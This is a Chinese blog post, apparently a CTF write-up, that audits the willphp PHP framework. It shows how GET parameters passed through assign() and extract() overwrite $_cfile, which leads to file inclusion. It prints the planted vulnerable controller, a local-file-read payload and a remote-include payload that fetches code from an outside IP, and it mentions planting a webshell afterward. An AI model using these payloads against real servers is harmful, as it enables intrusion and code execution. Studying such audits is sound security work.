---
author: Noel
pubDatetime: 2021-11-17T23:34:08.000+08:00
modDatetime: 2022-08-18T23:34:08.000+08:00
title: willphp代码审计
featured: false
draft: false
tags:
  - 代码审计
  - 网络安全
  - Willphp
description: 
  这是湖湘杯的一道web题目，当时没有分析出来，赛后再复盘一下.
---

> ***web安全的本质最终还得回归到代码层面.***
> 本专栏博客主要通过复现历史cms的漏洞,来学习,了解以及总结cms中最容易出问题的功能代码.


# 前言

这是湖湘杯的一道web题目，当时没有分析出来，赛后再复盘一下.
<!-- more -->

相关工具

```
willphp 源码版本 v2.1.5
phpstudypro
php7.3.4
wind10
vscode
xdebug
```

这道题目对willphp中的`app/controller/IndexController.php`中的`index()`方法进行了部分添加，师傅们再下载完`willphp`后记得在`app/controller/IndexController.php`中修改部分代码：

```php
class IndexController{
	public function index(){
		highlight_file(__FILE__);
        assign($_GET['name'],$_GET['value']);
		return view();
	}
}
```



# 0x01 变量覆盖

## 代码分析

访问www主页面，随便传入get参数name以及value，进行代码跟踪

![image-20211117125350051](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117125350051.png)

![image-20211117125515085](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117125515085.png)

进入`assign()`方法,跳转到`willphp/helper.php的第205行`,

![image-20211117125808230](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117125808230.png)

配合注释,大概能了解到这个函数的作用是将刚才通过get接收到的值传入的到模板中,继续跟进`\wiphp\View::assign()`

![image-20211117130316799](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117130316799.png)

这里直接跳转到一个加载框架的函数,.这里可以先不用管,继续跟踪找`assign()`.

在`willphp/wiphp/View.php的第13行`找到函数定义

![image-20211117130801602](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117130801602.png)

这个函数的逻辑很简单,就是将get接收到的`$_GET['name']`和`$_GET['value']`分别以键和值的方式储存在`$_vars`数组中.

到此为止,`assgin()`函数就跟踪完成,接下来是`view()`,继续跟进.

![image-20211117131356434](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117131356434.png)

跳转到`willphp/helper.php的第215行`,同第一次跟进到`assign()`函数类似,这里也给出了`view()`函数的作用以及相关参数说明.

![image-20211117131738557](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117131738557.png)

可以看到这里`view()`中调用了`\wiphp\View::fetch()`方法,跟进,跳转到`willphp/wiphp/View.php的第16行`

![image-20211117132158642](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117132158642.png)

同时还看到了上一步`assign()`函数的执行的结果.

继续一步步调试.

在38行之前,都没有我们可控的参数,这里就快速过一遍逻辑:主要是定义所需模板的路径以及文件.

到38行执行了`array_work_recursive()`函数,通过`selg::_parse_vars()`来处理`self::$_vars`,也就是删除`self::$_vars`中值的反斜杠.

![image-20211117132820269](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117132820269.png)

到目前位置,还没遇到危险函数.**不过别放弃,快要到了.**

继续调试发现在`39行`执行了`\Tple::render()`函数,跟进,跳转到`willphp/wiphp/Tple.php的第13行`

![image-20211117133404991](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117133404991.png)

由于传入的`$_vars`变量是可控的,所以我们需要时刻注意在哪些地方用到了这个变量.

继续调试,发现在15行时进入了if判断,执行`self::renderTo()`函数,

![image-20211117171329979](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117171329979.png)

由于这个函数涉及到可控变量`$_vars`,跟进,跳转到这个文件的第33行,

![image-20211117171530827](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117171530827.png)

继续走,发现在41行使用了变量`$_vars`,且涉及到危险函数`file_get_contents`,跟进`self::comp()`,发现这个函数内部没有使用到`$_vars`,那就不管,继续调试,

接着就回到了`renderTo()`的第44行.问题就出在两行.我们再回过来看看变量`$_vars`的内容:

![image-20211117172308070](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117172308070.png)

![image-20211117172421908](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117172421908.png)

由于这里使用了`extrac()`函数后又执行了在一个`include`文件包含`$_cfile`的操作,且`extract()`传入的内容完全可控.那此时就很容易想到构造`$_cfile`实现任意文件包含.



## 漏洞利用

在本地的d盘下创建一个文件`1.txt`

![image-20211117173416733](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117173416733.png)

构造get传参`/?name=cfile&value=d:\1.txt`

![image-20211117173656533](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117173656533.png)

可以看到这里我们已经拿到了`1.txt`中的内容.如果服务端的`php.ini`中设置了`allow_url_include=On`,那么漏洞还能进一步利用.在服务器上放置一个文件,其内容为:

![image-20211117174218061](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117174218061.png)

再次构造get传参包含远程文件`/?name=cfile&value=http://192.168.3.102/index1.txt`

![](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211117174359377.png)

可以看到此处已经成功代码执行,后续还可以直接写个码在漏洞服务器上,然后用蚁剑直接去连等等,这里就不在演示了,师傅们肯定都比我会.



# 0x02 总结

赛后复盘的时候还是很容易就能审计到漏洞点,但是为什么当时做题的时候没有审计出来呢?还是做题的时候没有静下心来,太浮躁了.我真是sb.

其次,本次审计的办法是采用跟踪函数的方法.通过文章,应该能感觉到通篇都在强调**用户可控**这个词.这也是代码审计中最重要的部分.通过观察用户可控的变量进行了哪些操作,是否存在危险函数,从而判断是否存在漏洞.希望对师傅们有所帮助.
